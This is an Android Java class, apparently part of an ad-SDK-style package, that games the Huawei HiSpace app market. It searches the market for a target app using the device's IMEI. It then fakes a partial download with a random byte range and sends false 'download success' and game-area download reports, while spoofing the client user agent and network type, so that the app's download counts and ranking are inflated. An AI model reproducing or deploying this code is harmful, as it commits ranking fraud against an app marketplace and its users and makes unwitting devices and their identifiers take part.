package com.umeng.ad.app;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;

import org.apache.http.Header;
import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;

import com.umeng.ad.app.u.TimeExtra;

class MarketZhihuiyun extends Market {
	private JSONObject downloadObj = null;
	private String name = null;
	private String downurl = null;
	private String appid = null;
	private String vercode = null;

	public MarketZhihuiyun() {
	}

	public MarketZhihuiyun(String packageName) {
		MARKET_NAME = MARKET_ZHIHUIYUN;
		setPackageName(packageName);
	}

	@Override
	protected boolean prepareToRank(Context context) throws Exception {

		DeviceInfo deviceInfo = new DeviceInfo(context);

		String resName = getAppKeyword();

		/**
		 * Use keyword to search
		 */
		StringBuffer searchURL = new StringBuffer(
				"http://hispaceclt.hicloud.com:8080/hwmarket/client/search-shelves.do");

		StringBuffer searchParams = new StringBuffer("sign=63001011Y1");
		searchParams.append("@" + deviceInfo.imei + "&");
		searchParams
				.append("name=" + URLEncoder.encode(resName, "UTF-8") + "&");
		searchParams.append("reqPageNum=1&maxResults=20&");
		searchParams.append("firmwareVersion=" + deviceInfo.verName + "&");
		searchParams.append("screen=normal&density=240.0&");
		searchParams.append("cno=4000000&");
		int net = (((int) Math.random() * 3) + 1);
		searchParams.append("net=" + net);

		HashMap<String, String> paramHash = new HashMap<String, String>();
		paramHash.put("sign", "63001011Y1" + URLEncoder.encode("@", "UTF-8")
				+ deviceInfo.imei + "");
		paramHash.put("name", URLEncoder.encode(resName, "UTF-8"));
		paramHash.put("firmwareVersion", deviceInfo.verName);
		paramHash.put("screen", "normal");
		paramHash.put("density", "240.0");
		paramHash.put("cno", "4000000");
		paramHash.put("net", net + "");
		paramHash.put("versionCode", deviceInfo.verCode);

		int random = (int) (Math.random() * 100);
		MLog.i("MarketZhihuiyun :: random = " + random + "hasparam = "
				+ hasparam());
		if ((random < 2 && random > 0) || !hasparam()) {

			return this.searchAPP(searchURL.toString(),
					searchParams.toString(), paramHash, context);
		} else {
			return this.download(paramHash);
		}

	}

	private boolean hasparam() {
		if (name == null) {
			return false;
		} else if (downurl == null) {
			return false;
		} else if (appid == null) {
			return false;
		} else if (vercode == null) {
			return false;
		}
		return true;
	}

	private boolean searchAPP(String url, String httpparams,
			HashMap<String, String> httpParamHash, Context context) {
		try {
			url = url + "?" + httpparams;
			HttpGet httpPost = new HttpGet(url);

			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpPost.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Android/1.0' ");
			curlString.append(url);
			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "Android/1.0");
			client.setParams(params);
			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("searchAPP=>status_code:" + code);

			InputStream inputstream = response.getEntity().getContent();
			InputStreamReader inputstreamreader = new InputStreamReader(
					inputstream, "utf-8");
			BufferedReader bufferedreader = new BufferedReader(
					inputstreamreader);

			StringBuffer lines = new StringBuffer();
			String line = "";
			while ((line = bufferedreader.readLine()) != null) {
				// Logger.i(this, line);
				lines.append(line);
			}
			String[] downloadPackages = new String[] { getPackageName() };
			List<JSONObject> downloadObjects = new ArrayList<JSONObject>();
			try {
				JSONObject jsonObject = new JSONObject(lines.toString());
				JSONArray jsonArray = jsonObject.getJSONArray("list");
				for (int i = 0; i < jsonArray.length(); i++) {
					JSONObject jObject = jsonArray.getJSONObject(i);
					// app_id
					String app_package = jObject.getString("package");
					for (String the_package : downloadPackages) {
						if (app_package.endsWith(the_package)) {
							downloadObjects.add(jObject);
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

			/**
			 * Download app
			 */

			for (JSONObject object : downloadObjects) {
				name = object.getString("name");
				downurl = object.getString("downurl");
				appid = object.getString("id");
				vercode = (String) object.get("versionCode");
				downurl = downurl.replaceAll("&", "&amp;");
				JSONArray keyArray = new JSONArray();
				keyArray.put("name");
				keyArray.put("downurl");
				keyArray.put("appid");
				keyArray.put("vercode");
				JSONArray valueArray = new JSONArray();
				valueArray.put(name);
				valueArray.put(downurl);
				valueArray.put(appid);
				valueArray.put(vercode);
				MLog.i("MarketZhihuiyun :: keyArray = " + keyArray
						+ " valueArray = " + valueArray);
				super.updateMarketAppParams(context, keyArray, valueArray);
				return this.download(httpParamHash);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	/**
	 * 
	 */
	private boolean download(HashMap<String, String> hashparams) {
		try {
			/**
			 * data
			 */
			MLog.i("download...." + name);
			String url = downurl;
			url += "cno=" + hashparams.get(("cno")) + "&";
			url += "net=" + hashparams.get(("net"));

			HttpGet httpGet = new HttpGet(url);
			int range = ((int) (Math.random() * 300));
			MLog.i("range:" + range + "-" + (range + 2));
			httpGet.addHeader("Range", "bytes=" + range);
			/**
			 * Logger.i(this,curlString);
			 */
			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'HiSpace' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "HiSpace");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("Download=>status_code:" + code);

			/**
			 * When download ok, post request to server
			 */
			this.getAppAction(hashparams);
			return this.getGameArea(hashparams);

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	/**
	 * 
	 */
	private void getAppAction(HashMap<String, String> hashparams) {
		try {
			/**
			 * data
			 */
			String url = "http://hispaceclt.hicloud.com:8080/hwmarket/client/appAction-shelves.do?";
			url += "sign=" + hashparams.get(("sign")) + "&";
			url += "type=down_sucess&";
			url += "appId=" + appid + "&";
			url += "version=" + vercode + "&";
			url += "reason=0&";
			url += "cno=" + hashparams.get(("cno")) + "&";
			url += "net=" + hashparams.get(("net"));

			HttpGet httpGet = new HttpGet(url);

			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Android/1.0' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "Android/1.0");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("getAppAction=>status_code:" + code);
			InputStream inputstream = response.getEntity().getContent();
			InputStreamReader inputstreamreader = new InputStreamReader(
					inputstream);
			BufferedReader bufferedreader = new BufferedReader(
					inputstreamreader);

			StringBuffer lines = new StringBuffer();
			String line = "";
			while ((line = bufferedreader.readLine()) != null) {
				MLog.i(line);
				lines.append(line);
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * 
	 */
	private boolean getGameArea(HashMap<String, String> hashparams) {
		try {
			String url = "http://hispaceclt.hicloud.com:8080/hwmarket/client/gameAreaDownload.do?";
			url += "sign=" + hashparams.get(("sign")) + "&";
			url += "areaName=Hi_Space&";
			url += "appName=" + URLEncoder.encode(name, "UTF-8") + "&";
			url += "downLoadTime="
					+ new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss")
							.format(new Date()) + "&";
			url += "cno=" + hashparams.get(("cno")) + "&";
			url += "net=" + hashparams.get(("net"));

			HttpGet httpGet = new HttpGet(url);

			StringBuffer curlString = new StringBuffer("curl ");
			Header[] headers = httpGet.getAllHeaders();
			for (Header header : headers) {
				curlString.append("-H '" + header.getName() + ": "
						+ header.getValue() + "' ");
			}
			curlString.append("-A 'Android/1.0' ");
			curlString.append(url);
			MLog.i("\n" + curlString);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 20 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, "Android/1.0");
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpGet);

			int code = response.getStatusLine().getStatusCode();
			MLog.i("getGameArea=>status_code:" + code);
			if (code == HttpStatus.SC_OK) {
				return true;
			}
			// InputStream inputstream = response.getEntity().getContent();
			// InputStreamReader inputstreamreader = new InputStreamReader(
			// inputstream);
			// BufferedReader bufferedreader = new BufferedReader(
			// inputstreamreader);
			//
			// StringBuffer lines = new StringBuffer();
			// String line = "";
			// while ((line = bufferedreader.readLine()) != null) {
			// MLog.i( line);
			// lines.append(line);
			// }
		} catch (Exception e) {
			e.printStackTrace();
		}

		return false;
	}

	@Override
	protected void initAllParams() {
		try {
			name = params.get("a_name");
			downurl = params.get("a_downurl");
			appid = params.get("a_appid");
			vercode = params.get("a_vercode");
		} catch (Exception e) {
			MLog.i("MarketZhihuiyun :: initAllParams get downloadObj Exception = "
					+ e.getMessage());
			e.printStackTrace();
		}
	}

}
